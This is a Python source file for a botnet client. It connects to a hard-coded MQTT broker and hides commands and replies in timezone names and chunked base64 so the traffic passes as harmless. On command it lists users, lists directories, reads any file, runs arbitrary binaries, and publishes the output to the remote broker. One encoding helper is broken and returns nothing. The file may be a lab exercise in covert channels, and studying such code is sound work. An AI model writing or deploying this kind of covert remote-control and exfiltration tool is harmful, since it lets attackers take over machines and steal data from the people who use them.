from paho.mqtt import client as mqtt
from datetime import datetime
import subprocess
import random
import base64
import json

client_id = f"SyncDevice{random.randint(1, 9999)}"

#################################### COMMON CODE STARTS HERE ###################################

# MQTT configuration
MQTT_BROKER = "147.32.82.209"
MQTT_PORT = 1883
MQTT_TOPIC = "sensors"

# Message fields
MSG_FIELD_TO_FAKE_LEGITIMATE = "local_datetime" # will send legitimate local datetime, just to act trustworthy
MSG_FIELD_BOT_ID = "local_datetime_leap"
MSG_FIELD_ENCRYPTED_MSG = "datetime_leap"
MSG_FIELD_TIMEZONES = "timezones"
MSG_FIELD_ACTION = "timezone"

# Commands
CMD_LIST_BOTS = 1
CMD_LIST_USERS = 2
CMD_LIST_DIR = 3
CMD_GET_USER_ID = 4
CMD_DOWNLOAD_FILE = 5
CMD_EXECUTE_BINARY = 6

COMMAND_TO_TIMEZONE = {
    CMD_LIST_BOTS: "America/New_York",
    CMD_LIST_USERS: "America/Los_Angeles",
    CMD_LIST_DIR: "America/Chicago",
    CMD_GET_USER_ID: "Europe/London",
    CMD_DOWNLOAD_FILE: "Europe/Paris",
    CMD_EXECUTE_BINARY: "Europe/Berlin",
}

TIMEZONE_TO_ACTION = {v.upper(): k for k, v in COMMAND_TO_TIMEZONE.items()}

CHAR_TO_TIMEZONE = {
    "A": "America/Anchorage",
    "B": "Europe/Berlin",
    "C": "America/Chicago",
    "D": "Asia/Dubai",
    "E": "Europe/Edinburgh",
    "F": "America/Fortaleza",
    "G": "Europe/Gibraltar",
    "H": "Pacific/Honolulu",
    "I": "Asia/Istanbul",
    "J": "Asia/Jakarta",
    "K": "Europe/Kiev",
    "L": "Europe/London",
    "M": "America/Mexico_City",
    "N": "America/New_York",
    "O": "Europe/Oslo",
    "P": "Europe/Prague",
    "Q": "America/Quebec",
    "R": "Europe/Rome",
    "S": "Asia/Shanghai",
    "T": "Asia/Tokyo",
    "U": "Asia/Ulaanbaatar",
    "V": "Europe/Vienna",
    "W": "Europe/Warsaw",
    "X": "America/Cancun",  # X is difficult - using location with X sound
    "Y": "America/Yakutat",
    "Z": "Europe/Zurich",
    ",": "Africa/Johannesburg",
    " ": "Africa/Lagos",
}

TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}


def do_very_strange_encryption(text: str):
    encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
    
    # char_to_timezone values
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    chunks = []
    i = 0
    while i < len(encoded):
        chunk_size = random.randint(7, 20)
        chunks.append(encoded[i:i+chunk_size])
        i += chunk_size
    
    # create JSON mapping timezones to chunks, cycling through timezones if needed
    result = {}
    for idx, chunk in enumerate(chunks):
        timezone = timezones[idx % len(timezones)]
        if timezone not in result:
            result[timezone] = []
        result[timezone].append(chunk)
    
    return json.dumps(result)


def do_very_strange_decryption(encrypted_json: str):
    data = json.loads(encrypted_json)
    
    # char_to_timezone values
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    # Reconstruct chunks in correct order
    chunks = []
    timezone_idx = 0
    chunk_counts = {tz: 0 for tz in timezones}
    
    # Continue until all chunks are collected
    while True:
        current_tz = timezones[timezone_idx % len(timezones)]
        
        if current_tz in data and chunk_counts[current_tz] < len(data[current_tz]):
            chunks.append(data[current_tz][chunk_counts[current_tz]])
            chunk_counts[current_tz] += 1
            timezone_idx += 1
        else:
            # Check if we've collected all chunks
            all_collected = all(
                tz not in data or chunk_counts[tz] == len(data[tz])
                for tz in timezones
            )
            if all_collected:
                break
            timezone_idx += 1
            
        # Safety check to avoid infinite loop
        if timezone_idx > 10000:
            break
    
    # Concatenate chunks and decode
    encoded = ''.join(chunks)
    decoded = base64.b64decode(encoded).decode('utf-8')
    return decoded

def encode_as_timezones(text: str):
    # convert each character to its corresponding timezone
    encoded = []
    for char in text.upper():
        if char in CHAR_TO_TIMEZONE:
            encoded.append(CHAR_TO_TIMEZONE[char])
        else: # char missing in dictionary
            encoded.append(CHAR_TO_TIMEZONE[', '])

def decode_as_timezones(timezones_encoded_msg):
    # convert list of timezones back to characters
    decoded = []
    for tz in timezones_encoded_msg:
        if tz.upper() in TIMEZONE_TO_CHAR:
            decoded.append(TIMEZONE_TO_CHAR[tz.upper()])
    return ''.join(decoded)

def encode(text: str):
    if len(text) <= 100:
        return [MSG_FIELD_TIMEZONES, encode_as_timezones(text)]
    else:
        return [MSG_FIELD_ENCRYPTED_MSG, do_very_strange_encryption(text)]

################################### COMMON CODE ENDS HERE ###################################


def on_connect(client, userdata, flags, rc):
    # rc - connection result code. 0 - success, otherwise failure.
    if rc == 0:
        client.subscribe(MQTT_TOPIC)
    else:
        client.disconnect()
        exit(1)

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode()
        data = decode_payload(payload)
        execute_action(client, data["action"], data["path"])
    except Exception as ex:
        print(f"Error processing message: {ex}")

def decode_payload(payload: str):
    try:
        data = json.loads(payload)

        if MSG_FIELD_ACTION not in data:
            raise ValueError(f"Missing {MSG_FIELD_ACTION} message field.")
        
        action_timezone = data[MSG_FIELD_ACTION].upper()
        if action_timezone not in TIMEZONE_TO_ACTION:
            raise ValueError(f"Unknown timezone: {action_timezone}")

        action = TIMEZONE_TO_ACTION[action_timezone]
        path = None

        if MSG_FIELD_ENCRYPTED_MSG in data:
            encrypted_msg = data[MSG_FIELD_ENCRYPTED_MSG]
            path = do_very_strange_decryption(encrypted_msg)
        
        return {
            "action": action,
            "path": path
        }
    except Exception:
        raise Exception("Invalid payload.")
        

def execute_action(client, action: int, path: str = None):
    response = {
        MSG_FIELD_TO_FAKE_LEGITIMATE: datetime.now().isoformat()
    }

    try:
        if action == CMD_LIST_BOTS:
            response[MSG_FIELD_BOT_ID] = client_id

        elif action == CMD_LIST_USERS:
            # execute 'w' command to list logged in users
            result = subprocess.run(['w'], capture_output=True, text=True, timeout=5000)
            output_text = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            response.update(encode(output_text))
        
        elif action == CMD_LIST_DIR:
            if not path:
                raise Exception("Missing path.")
            
            result = subprocess.run(['ls', path], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            response.update(encode(output))
            
        elif action == CMD_GET_USER_ID:
            # execute 'id' command to get user id
            result = subprocess.run(['id'], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            response.update(encode(output))
            
        elif action == CMD_DOWNLOAD_FILE:
            if not path:
                raise Exception("Missing path.")
           
            with open(path, 'r') as file:
                content = file.read()
            response.update(encode(content))
            
        elif action == CMD_EXECUTE_BINARY:
            if not path:
                raise Exception("Missing path.")
        
            result = subprocess.run([path], capture_output=True, text=True, timeout=5000)
            output = f"OUT {result.stdout}, ERR {result.stderr}"
            response.update(encode(output))
    
    except FileNotFoundError:
        response.update(encode(f"{path} not found"))
    except subprocess.TimeoutExpired:
        response.update(encode("Timeout"))
    except Exception as ex:
        response.update(encode(str(ex)))
        
    client.publish(MQTT_TOPIC, json.dumps(response))


def main():
    # create MQTT client
    client = mqtt.Client(client_id)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_forever()
    except KeyboardInterrupt:
        client.disconnect()
    except Exception as ex:
        print(f"An error occurred: {ex}")
        client.disconnect()


if __name__ == "__main__":
    main()